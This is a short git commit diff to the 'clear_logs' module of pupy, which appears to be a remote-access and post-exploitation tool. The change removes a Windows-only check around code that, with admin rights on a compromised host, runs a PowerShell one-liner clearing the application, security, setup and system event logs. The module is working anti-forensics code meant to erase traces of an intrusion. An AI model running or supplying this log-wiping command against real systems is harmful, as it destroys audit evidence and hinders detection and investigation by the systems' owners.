7989714fa70c7c138256e85552f5b9992cac7b89
AlessandroZ <zanni.alessandro@gmail.com>
2016-11-07 22:02:42 +0100

    remove unused line

--- pupy/modules/clear_logs.py
+++ pupy/modules/clear_logs.py
@@ -12,14 +12,13 @@ class ClearLogs(PupyModule):
         self.arg_parser = PupyArgumentParser(prog="clear_logs", description=self.__doc__)
 
     def run(self, args):
-        if self.client.is_windows():
-            if self.client.desc['intgty_lvl'] != "High":
-                self.error('You need admin privileges to clear logs')
-                return 
-            
-            powershell_cmd = '$events_logs="application","security","setup","system"; ForEach ($event in $events_logs) { [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog("$event")}'
-            output = shell_exec(self.client, powershell_cmd, shell='powershell.exe')
-            if not output:
-                self.success('Logs deleted successfully')
-            else:
-                self.error('An error occured: \n%s' % output)
+        if self.client.desc['intgty_lvl'] != "High":
+            self.error('You need admin privileges to clear logs')
+            return 
+        
+        powershell_cmd = '$events_logs="application","security","setup","system"; ForEach ($event in $events_logs) { [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog("$event")}'
+        output = shell_exec(self.client, powershell_cmd, shell='powershell.exe')
+        if not output:
+            self.success('Logs deleted successfully')
+        else:
+            self.error('An error occured: \n%s' % output)
